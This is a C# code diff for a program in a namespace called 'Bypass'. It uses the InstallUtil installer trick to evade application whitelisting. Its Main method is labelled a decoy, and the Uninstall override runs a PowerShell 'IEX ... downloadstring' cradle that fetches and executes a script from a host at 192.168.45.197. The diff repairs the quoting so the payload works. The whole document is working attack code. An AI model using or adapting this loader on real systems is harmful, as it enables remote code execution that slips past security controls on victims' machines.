@@ -9,21 +9,26 @@ namespace Bypass
     {
         static void Main(string[] args)
         {
-            Console.WriteLine("Thanks Chvancooten.");
+            Console.WriteLine("This is the main method which is a decoy");
         }
     }
+
     [System.ComponentModel.RunInstaller(true)]
-    public class Sample : Installer
+    public class Sample : System.Configuration.Install.Installer
     {
         public override void Uninstall(System.Collections.IDictionary savedState)
         {
-            String cmd = "IEX (New-Object Net.Webclient).downloadstring("http://192.168.45.197:8000/pog.css")";
+            String cmd = "IEX (New-Object Net.Webclient).downloadstring('http://192.168.45.197:8000/pog.css')";
             Runspace rs = RunspaceFactory.CreateRunspace();
             rs.Open();
+
             PowerShell ps = PowerShell.Create();
             ps.Runspace = rs;
+
             ps.AddScript(cmd);
+
             ps.Invoke();
+
             rs.Close();
         }
     }
